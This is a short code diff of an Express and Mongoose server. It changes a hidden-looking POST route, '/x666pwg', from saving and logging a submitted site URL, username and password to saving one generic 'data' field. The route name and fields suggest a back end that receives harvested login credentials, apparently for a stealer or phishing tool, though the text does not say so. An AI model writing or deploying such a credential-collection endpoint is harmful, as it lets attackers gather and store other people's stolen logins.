@@ -10,9 +10,7 @@ app.use(bodyParser.json());
 const port = process.env.PORT || 3000;
 
 const LifeSchema = new mongoose.Schema({
-    url: String,
-    username: String,
-    password: String,
+    data: String
 })
 
 const Life = mongoose.model('Life', LifeSchema);
@@ -20,9 +18,7 @@ const Life = mongoose.model('Life', LifeSchema);
 app.post('/x666pwg', async (req,res) => {
     try {
         let life = new Life({
-            url: req.body.url,
-            username: req.body.username,
-            password: req.body.password,
+            data: req.body.data
         })
         await life.save()
         console.log(life);
